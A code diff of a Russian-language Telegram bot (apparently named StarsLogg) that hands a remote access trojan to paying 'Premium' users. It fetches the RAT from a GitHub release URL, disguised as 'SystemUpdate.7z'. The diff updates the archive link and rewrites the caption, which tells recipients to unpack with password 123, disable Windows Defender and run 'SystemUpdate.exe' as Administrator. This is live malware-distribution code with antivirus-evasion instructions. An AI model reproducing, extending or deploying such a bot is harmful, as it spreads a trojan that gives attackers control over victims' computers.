@@ -30,8 +30,8 @@ REF_REWARD    = 0.1
 REF_MARKUP    = 0.5
 BOT_LINK      = "https://t.me/StarsLogg_Robot?start=" 
 
-# Твоя ссылка на архив с RAT
-RAT_URL = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.zip"
+# ССЫЛКА НА 7Z АРХИВ (ТВОЙ ФАЙЛ)
+RAT_URL = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.7z"
 
 # ---------- BOT / TELEGRAPH ----------
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
@@ -396,7 +396,7 @@ def cb_get_rat_exe(call):
     if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
         return bot.answer_callback_query(call.id, "❌ Только Premium!", show_alert=True)
     
-    msg = bot.send_message(call.from_user.id, "⏳ Загружаю файл с GitHub...")
+    msg = bot.send_message(call.from_user.id, "⏳ Скачиваю архив, подождите...")
     try:
         r = requests.get(RAT_URL, stream=True)
         r.raise_for_status()
@@ -406,10 +406,9 @@ def cb_get_rat_exe(call):
             r.raw, 
             caption="🦠 <b>Ваш RAT-клиент</b>\n\n"
                     "<b>Инструкция:</b>\n"
-                    "1. Скачайте архив.\n"
-                    "2. Распакуйте (пароль: 123).\n"
-                    "3. Отключите антивирус.\n"
-                    "4. Запустите .exe."
+                    "1. Скачайте архив и распакуйте (пароль: <code>123</code>).\n"
+                    "2. Отключите антивирус (Windows Defender).\n"
+                    "3. Запустите <code>SystemUpdate.exe</code> от имени Администратора."
         )
         bot.delete_message(call.from_user.id, msg.message_id)
     except Exception as e:
